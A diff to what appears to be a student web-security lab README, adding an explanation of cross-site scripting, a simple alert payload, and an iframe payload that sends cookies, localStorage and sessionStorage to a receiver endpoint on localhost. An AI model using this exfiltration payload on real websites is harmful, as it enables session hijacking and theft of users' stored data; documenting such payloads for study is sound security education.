@@ -124,8 +124,19 @@ but we can upload other file too
 ![im1](https://github.com/Sonakhach/project2/blob/main/Screenshot_2024-12-04_15_02_45.png)
 ![im1](https://github.com/Sonakhach/project2/blob/main/Screenshot_2024-12-04_15_05_02.png)
 
-#### 4.XSS 
+#### 4. Cross-Site Scripting (XSS)
 
-![im1](https://github.com/Sonakhach/project2/blob/main/Screenshot_2024-12-02_11_29_25.png)
+About attack: Cross-Site Scripting (XSS) is a type of security vulnerability in web applications where an attacker injects malicious scripts into trusted websites. These scripts run in the context of other users' browsers, potentially allowing the attacker to steal sensitive information like session cookies, manipulate website content, or perform unauthorized actions on behalf of the victim.
+**There are many payloads for XSS attacks. Some of them can be found in the https://xss.js.org/**
+The payload is 
+```
+<IFRAME SRC="javascript:alert('XSS');"></IFRAME>
+```
+![im1](https://github.com/Sonakhach/project2/blob/main/Screenshot%20from%202024-12-05%2002-52-29.png)
+payload can be 
+
+<iframe src="javascript:fetch('http://localhost:5000/receiver', {method: 'POST',headers: { 'Content-Type': 'application/json' },body: JSON.stringify({cookies: document.cookie,localStorage: JSON.stringify(localStorage),sessionStorage: JSON.stringify(sessionStorage)})});"> </iframe>
+```
+![im1](https://github.com/Sonakhach/project2/blob/main/Screenshot%20from%202024-12-05%2002-54-11.png)
 
 ![im1](https://github.com/Sonakhach/project2/blob/main/Screenshot_2024-12-02_08_48_45.png)
